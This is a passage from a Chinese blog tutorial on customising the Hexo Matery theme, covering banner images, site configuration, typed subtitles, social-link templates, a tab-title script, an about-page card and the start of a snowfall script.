/layout/_partial/bg-cover-content.ejs 文件的 代码中：</p><figure class="highlight arcade"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'.bg-cover'</span>).css(<span class="string">'background-image'</span>, <span class="string">'url(/medias/banner/'</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getDay() + <span class="string">'.jpg)'</span>);</span><br></pre></td></tr></tbody></table></figure><p>在 /source/medias/featureimages 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 _config.yml 做同步修改。</p><p>如果想改为每小时或者每分钟切换 banner 图的话，需要将 getDay() 改为 getHours() 或者 getMinutes() 即可。</p><h4 id="修改网站相关信息"><a href="#修改网站相关信息" class="headerlink" title="修改网站相关信息"></a>修改网站相关信息</h4><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#这是根目录下的配置文件信息</span></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">LeavesBlog</span><span class="comment">#网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">'上下而求索'</span> <span class="comment">#网站副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">'keep hungry,keep foolish'</span><span class="comment">#网站描述description 主要用于5E0，告诉搜索引擎一个关于您站点的简单描述</span></span><br><span class="line"><span class="attr">keywords:</span> [<span class="string">Linux，cybersecurity等</span>]<span class="comment">#网站的关键词。使用半角逗号“，”分隔多个关键词</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">咕咕星</span><span class="comment">#您的名字</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span><span class="comment">#网站使用的语言。建议修改为zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span><span class="comment">#网站时区。Hexo默认使用您电脑的时区。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是主题配置文件的相关信息</span></span><br><span class="line"><span class="comment"># 配置网站favicon和网站LOGO</span></span><br><span class="line"><span class="comment"># 此处我用的CDN，也可以使用本地文件</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">https://cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png</span></span><br><span class="line"><span class="attr">logo:</span> <span class="string">https://cdn.jsdelivr.net/gh/guixinchn/image/blog/logo.png</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站副标题，打字效果</span></span><br><span class="line"><span class="comment"># 如果有符号 ‘ ，请在 ’ 前面加上 \</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">true</span> <span class="comment"># 是否循环</span></span><br><span class="line">  <span class="attr">showCursor:</span> <span class="literal">true</span> <span class="comment"># 是否显示光标</span></span><br><span class="line">  <span class="attr">startDelay:</span> <span class="number">300</span> <span class="comment"># 开始延迟</span></span><br><span class="line">  <span class="attr">typeSpeed:</span> <span class="number">100</span> <span class="comment"># 打字速度</span></span><br><span class="line">  <span class="attr">backSpeed:</span> <span class="number">50</span> <span class="comment"># 删除速度</span></span><br><span class="line">  <span class="attr">sub1:</span> <span class="string">如果放弃太早，你永远都不知道自己会错过什么。</span></span><br><span class="line">  <span class="attr">sub2:</span> <span class="string">没有伞的孩子必须努力奔跑！</span></span><br><span class="line">  <span class="attr">sub3:</span> <span class="string">花开不是为了花落，而是为了开的更加灿烂。</span></span><br><span class="line">  <span class="attr">sub4:</span> <span class="string">没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生。</span></span><br></pre></td></tr></tbody></table></figure><p>注意：</p><p>网站打字效果副标题默认有两个，即 sub1 和 sub2，如果想写多个，则需要修改两处地方，首先修改配置文件，如上面所示，在 sub1 和 sub2 后面继续添加即可，然后在去主题目录下的 layout 文件夹下的_partial 文件夹，修改 bg-cover-content.ejs 文件，大约在 12 行左右，如下面所示：</p><figure class="highlight xl"><table><tbody><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">"description center-align"</span>&gt;</span><br><span class="line">                &lt;% <span class="keyword">if</span> (<span class="built_in">theme</span>.<span class="built_in">subtitle</span>.enable) { %&gt;</span><br><span class="line">                &lt;span id=<span class="string">"subtitle"</span>&gt;&lt;/span&gt;</span><br><span class="line">                &lt;script src=<span class="string">"https://cdn.jsdelivr.net/npm/typed.js@2.0.11"</span>&gt;&lt;/script&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    var typed = new Typed(<span class="string">"#subtitle"</span>, {</span><br><span class="line">                        strings: [<span class="string">'&lt;%= theme.subtitle.sub1 %&gt;'</span>,</span><br><span class="line">   <span class="string">'&lt;%= theme.subtitle.sub2 %&gt;'</span>,</span><br><span class="line">  <span class="string">'&lt;%= theme.subtitle.sub3 %&gt;'</span>,</span><br><span class="line">   <span class="string">'&lt;%= theme.subtitle.sub4 %&gt;'</span>],</span><br><span class="line">                        startDelay: &lt;%= <span class="built_in">theme</span>.<span class="built_in">subtitle</span>.startDelay %&gt;,</span><br><span class="line">                        typeSpeed: &lt;%= <span class="built_in">theme</span>.<span class="built_in">subtitle</span>.typeSpeed %&gt;,</span><br><span class="line">                        <span class="keyword">loop</span>: &lt;%= <span class="built_in">theme</span>.<span class="built_in">subtitle</span>.<span class="keyword">loop</span> %&gt;,</span><br><span class="line">                        backSpeed: &lt;%= <span class="built_in">theme</span>.<span class="built_in">subtitle</span>.backSpeed %&gt;,</span><br><span class="line">                        showCursor: &lt;%= <span class="built_in">theme</span>.<span class="built_in">subtitle</span>.showCursor %&gt;</span><br><span class="line">                    });</span><br><span class="line">                &lt;/script&gt;</span><br><span class="line">                &lt;% } <span class="keyword">else</span> { %&gt;</span><br><span class="line">                    &lt;%= config.description %&gt;</span><br><span class="line">                &lt;% } %&gt;</span><br><span class="line">            &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="社交链接的修改"><a href="#社交链接的修改" class="headerlink" title="社交链接的修改"></a>社交链接的修改</h4><p>在主题的配置文件中修改</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># The configurations of the second line of home banner</span></span><br><span class="line"><span class="meta"># icon/button will not show up <span class="meta-keyword">if</span> you leave the corresponding socialLink empty</span></span><br><span class="line"><span class="meta"># 首页 banner 中的第二行个人信息配置，留空即不启用</span></span><br><span class="line"><span class="symbol">socialLink:</span></span><br><span class="line"><span class="symbol">  github:</span>  https:<span class="comment">//github.com/GreenLeavesl || github</span></span><br><span class="line"><span class="symbol">  email:</span> <span class="meta">#1181062873@qq.com</span></span><br><span class="line"><span class="symbol">  facebook:</span> <span class="meta"># https:<span class="comment">//www.facebook.com/xxx</span></span></span><br><span class="line"><span class="symbol">  twitter:</span> <span class="meta"># https:<span class="comment">//twitter.com/xxx</span></span></span><br><span class="line"><span class="symbol">  qq:</span> <span class="meta">#1181062873</span></span><br><span class="line"><span class="symbol">  weibo:</span> <span class="meta"># https:<span class="comment">//weibo.com/xxx</span></span></span><br><span class="line"><span class="symbol">  zhihu:</span> <span class="meta"># https:<span class="comment">//www.zhihu.com/xxx</span></span></span><br><span class="line"><span class="symbol">  csdn:</span> https:<span class="comment">//blog.csdn.net/hahakenihaoa || csdn</span></span><br><span class="line"><span class="symbol">  rss:</span> true <span class="meta"># true、false</span></span><br></pre></td></tr></tbody></table></figure><p>其中的 weixin 我是用的图片链接，会跳转到一个新的标签页，之后还需要修改 ejs 文件，文件在主题目录下的 layout 文件夹下的_partial 文件夹，修改 social-link.ejs，添加相关的配置，比如：</p><figure class="highlight erb"><table><tbody><tr><td class="code"><pre><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.github) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.github </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"访问我的GitHub"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-github"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.email) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"mailto:&lt;%=</span></span></span><span class="ruby"> theme.socialLink.email </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"邮件联系我"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-envelope-open"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.facebook) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.facebook </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的Facebook: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.facebook </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-facebook-f"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.twitter) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.twitter </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的Twitter: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.twitter </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-twitter"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.qq) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=&lt;%=</span></span></span><span class="ruby"> theme.socialLink.qq </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"QQ联系我: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.qq </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-qq"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.weibo) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.weibo </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的微博: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.weibo </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-weibo"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.zhihu) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.zhihu </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的知乎: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.zhihu </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-zhihu1"</span>&gt;</span>知<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.rss) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%-</span></span></span><span class="ruby"> url_for(<span class="string">'/atom.xml'</span>) </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"RSS 订阅"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-rss"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.jianshu) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.jianshu </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的简书: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.jianshu </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-jianshu"</span>&gt;</span>简<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.csdn) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.csdn </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的CSDN: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.csdn </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-csdn"</span>&gt;</span>C<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.juejin) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.juejin </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的掘金: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.juejin </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-juejin"</span>&gt;</span>掘<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.cnblogs) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.cnblogs </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"关注我的博客园: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.cnblogs </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-juejin"</span>&gt;</span>博<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">if</span> (theme.socialLink.weixin) { </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> theme.socialLink.weixin </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"微信联系我: &lt;%=</span></span></span><span class="ruby"> theme.socialLink.weixin </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-weixin"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> } </span><span class="xml">%&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="其他一些个性DIY"><a href="#其他一些个性DIY" class="headerlink" title="其他一些个性DIY"></a>其他一些个性DIY</h3><h4 id="动态标题"><a href="#动态标题" class="headerlink" title="动态标题"></a>动态标题</h4><p>实现方法，引入 js 文件，在主题文件下的 /source/js/ 下新建 FunnyTitle.js，增加以下代码</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> OriginTitle = <span class="built_in">document</span>.title;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) {</span><br><span class="line">        $(<span class="string">'[rel="icon"]'</span>).attr(<span class="string">'href'</span>, <span class="string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png"</span>);</span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">'我相信你还会回来的！'</span>;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        $(<span class="string">'[rel="icon"]'</span>).attr(<span class="string">'href'</span>, <span class="string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png"</span>);</span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">'哈哈，我就知道！'</span> + OriginTitle;</span><br><span class="line">        titleTime = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">            <span class="built_in">document</span>.title = OriginTitle;</span><br><span class="line">        }, <span class="number">2000</span>);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>然后在添加到 themes/matery/layout/layout.ejs 引入<br><code>&lt;script src="&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('/js/FunnyTitle.js') %&gt;"&gt;&lt;/script&gt;</code></p><h3 id="关于我页面添加个人简历"><a href="#关于我页面添加个人简历" class="headerlink" title="关于我页面添加个人简历"></a>关于我页面添加个人简历</h3><p>打开 theme/matery/layout/about.ejs 文件，大约在 13 行。有一个 <code>`</code> <code>`</code> 标签，找出其对应结尾的标签，大约在 61 行左右，然后在新增如下代码：</p><figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"card"</span>&gt;</span><br><span class="line">     &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"card-content"</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"card-content article-card-content"</span>&gt;</span><br><span class="line">             &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"title center-align"</span> data-aos=<span class="string">"zoom-in-up"</span>&gt;</span><br><span class="line">                 &lt;i <span class="built_in">class</span>=<span class="string">"fa fa-address-book"</span>&gt;&lt;/i&gt;&amp;nbsp;&amp;nbsp;&lt;%- __('个人简历') %&gt;</span><br><span class="line">              &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">                 &lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"articleContent"</span> data-aos=<span class="string">"fade-up"</span>&gt;</span><br><span class="line">                     &lt;%- page.content %&gt;</span><br><span class="line">                 &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">           &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">      &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="添加雪花飘落效果"><a href="#添加雪花飘落效果" class="headerlink" title="添加雪花飘落效果"></a>添加雪花飘落效果</h3><p>实现方法：在themes/matery/source/libs/others下新建文件snow.js，并插入如下代码:（我用样式二）</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*样式一*/</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>{</span><br><span class="line">    $.fn.snow = <span class="function"><span class="keyword">function</span>(<span class="params">options</span>)</span>{</span><br><span class="line">    <span class="keyword">var</span> $flake = $(<span class="string">'&lt;div id="snowbox" /&gt;'</span>).css({<span class="string">'position'</span>: <span class="string">'absolute'</span>,<span class="string">'z-index'</span>:<span class="string">'9999'</span>, <span class="string">'top'</span>: <span class="string">'-50px'</span>}).html(<span class="string">'&amp;#10052;'</span>),</span><br><span class="line">    documentHeight  = $(<span class="built_in">document</span>).height(),</span><br><span class="line">    documentWidth   = $(<span class="built_in">document</span>).width(),</span><br><span class="line">    defaults = {</span><br><span class="line">        <span class="attr">minSize</span>     : <span class="number">10</span>,</span><br><span class="line">        <span class="attr">maxSize</span>     : <span class="number">20</span>,</span><br><span class="line">        <span class="attr">newOn</span>       : <span class="number">1000</span>,</span><br><span class="line">        <span class="attr">flakeColor</span>  : <span class="string">"#AFDAEF"</span> <span class="comment">/* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */</span></span><br><span class="line">    },</span><br><span class="line">    options = $.extend({}, defaults, options);</span><br><span class="line">    <span class="keyword">var</span> interval= <span class="built_in">setInterval</span>( <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="keyword">var</span> startPositionLeft = <span class="built_in">Math</span>.random() * documentWidth - <span class="number">100</span>,</span><br><span class="line">    startOpacity = <span class="number">0.5</span> + <span class="built_in">Math</span>.random(),</span><br><span class="line">    sizeFlake = options.minSize + <span class="built_in">Math</span>.random() * options.maxSize,</span><br><span class="line">    endPositionTop = documentHeight - <span class="number">200</span>,</span><br><span class="line">    endPositionLeft = startPositionLeft - <span class="number">500</span> + <span class="built_in">Math</span>.random() * <span class="number">500</span>,</span><br><span class="line">    durationFall = documentHeight * <span class="number">10</span> + <span class="built_in">Math</span>.random() * <span class="number">5000</span>;</span><br><span class="line">    $flake.clone().appendTo(<span class="string">'body'</span>).css({</span><br><span class="line">        <span class="attr">left</span>: startPositionLeft,</span><br><span class="line">        